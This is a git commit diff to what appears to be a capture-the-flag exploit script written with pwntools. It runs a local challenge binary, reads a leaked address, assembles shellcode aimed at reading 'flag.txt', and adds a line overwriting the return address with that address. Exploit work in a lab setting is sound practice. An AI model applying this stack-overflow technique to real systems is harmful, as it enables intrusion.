d54fcb60dbee6c2c647457de51aeac1ba9602b6d
William Mironchuk <wmironchuk@umass.edu>
2022-03-01 21:22:00 -0500

    I should know by now

--- chall_3/chall_3.py
+++ chall_3/chall_3.py
@@ -3,11 +3,11 @@ from pwnlib.util.packing import p64
 
 PWNSIZE = 64 // 4
 p = pwn.process("./chall")
-p.recvline()
+print(str(p.recvline(), "ascii"))
 p.sendline(bytes(str(PWNSIZE), "ascii"))
 payload = bytearray()
 address = int(p.recvline().partition(b": ")[-1].strip().decode("ascii"), 16)
-p.recvline()
+print(str(p.recvline(), "ascii", "ignore"))
 
 pwn.context.clear(arch="amd64")
 FLAG_STRING = "flag.txt"
@@ -36,4 +36,9 @@ payload += pwn.asm("""
         """.format(hex((19 * 4) - 1)))
 assert (len(payload) < 18 * 4), "payload is too long already"
 payload += b"1" * ((19 * 4) + 4 - len(payload))
+payload += p64(address)
 print(str(payload, "ascii", "ignore"))
+split_up_payload = (int.from_bytes(cint)
+                    for cint in payload[::4])
+for integer in map(str, split_up_payload):
+    print(integer)
